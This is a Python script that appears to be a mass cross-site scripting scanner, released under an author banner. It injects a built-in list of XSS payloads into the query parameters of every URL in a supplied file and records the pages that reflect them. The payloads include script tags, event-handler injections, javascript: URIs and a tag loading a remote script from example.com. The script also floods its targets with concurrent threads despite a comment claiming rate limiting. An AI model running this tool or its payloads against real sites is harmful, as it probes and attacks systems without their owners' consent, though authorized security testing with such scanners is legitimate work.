#!/usr/bin/env python3

import sys
import requests
import threading
from colorama import Fore, Style
import time
import os
from queue import Queue


print(
    Fore.RED +
    
    """
 _  _  ___  ___       ___  _   _  ____  ___  _  _  ____  ____   
( \/ )/ __)/ __)     / __)( )_( )( ___)/ __)( )/ )( ___)(  _ \  
 )  ( \__ \\__ \ ___( (__  ) _ (  )__)( (__  )  (  )__)  )   /  
(_/\_)(___/(___/(___)\___)(_) (_)(____)\___)(_)\_)(____)(_)\_) 

                                             [ https://x.com/XxM4DxX_ ]

   """ + Fore.RESET
)


print()
print()

# Define the payloads
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<a href=\"javascript:alert('XSS')\">Click me</a>",
    "\"><script>alert('XSS')</script>",
    "<input type=\"text\" value=\"XSS\" onfocus=\"alert('XSS')\">",
    "<svg onload=alert('XSS')>",
    "<a href=\"#\" onmouseover=\"alert('XSS')\">Hover me</a>",
    "<script src=\"http://example.com/xss.js\"></script>",
    "<iframe src=\"javascript:alert('XSS');\"></iframe>",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS');\">"
]

# Output file path
output_file_path = os.path.expanduser('~/vulnweb/final_res.txt')

def read_file(filepath):
    with open(filepath, 'r') as f:
        return [line.strip() for line in f]

urls = read_file(sys.argv[1])  # Read URLs from the first command line argument

output_lock = threading.Lock()

def send_req(url, payload):
    time.sleep(0.15)  # To avoid overwhelming the server
    url = url.replace("=", f"={payload}")

    try:
        res = requests.get(url)
        if payload in res.text:
            result = f"XSS Found at {url} with payload: {payload}"
            with output_lock:
                with open(output_file_path, 'a') as f:
                    f.write(result + '\n')
            print(Fore.GREEN + result + Fore.RESET)
        else:
            print(Fore.RED + f"XSS NOT Found at {url}" + Fore.RESET)
    except Exception as e:
        print(Fore.RED + f"Error occurred: {e}" + Fore.RESET)

threads = []
for payload in payloads:
    for url in urls:
        t = threading.Thread(target=send_req, args=(url, payload))
        t.start()
        threads.append(t)

for t in threads:
    t.join()

print(Fore.YELLOW + "Scanning completed. Results are in final_res.txt" + Fore.RESET)
